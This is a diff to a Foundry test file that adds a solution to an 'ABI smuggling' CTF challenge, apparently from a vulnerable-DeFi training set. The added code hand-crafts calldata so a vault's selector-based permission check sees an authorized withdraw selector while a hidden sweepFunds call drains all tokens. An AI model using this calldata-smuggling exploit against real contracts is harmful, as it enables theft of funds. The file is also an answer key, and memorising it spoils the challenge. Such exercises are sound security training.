@@ -73,7 +73,30 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes4 authorizedSelector = hex"d9caed12"; // withdraw(address,address,uint256)
+
+        // Real inner call that will be decoded as actionData and executed.
+        bytes memory innerActionData = abi.encodePacked(
+            SelfAuthorizedVault.sweepFunds.selector,
+            uint256(uint160(recovery)),
+            uint256(uint160(address(token)))
+        );
+
+        // Craft execute(address,bytes) calldata manually:
+        // - Byte 100 contains the authorized withdraw selector (permission check reads here).
+        // - The bytes argument offset points to later data where sweepFunds calldata lives.
+        bytes memory craftedCalldata = abi.encodePacked(
+            AuthorizedExecutor.execute.selector,
+            bytes32(uint256(uint160(address(vault)))),
+            bytes32(uint256(0x80)),
+            bytes32(0),
+            bytes32(uint256(uint32(authorizedSelector)) << 224),
+            bytes32(uint256(innerActionData.length)),
+            innerActionData
+        );
+
+        (bool ok,) = address(vault).call(craftedCalldata);
+        require(ok, "exploit failed");
     }
 
     /**
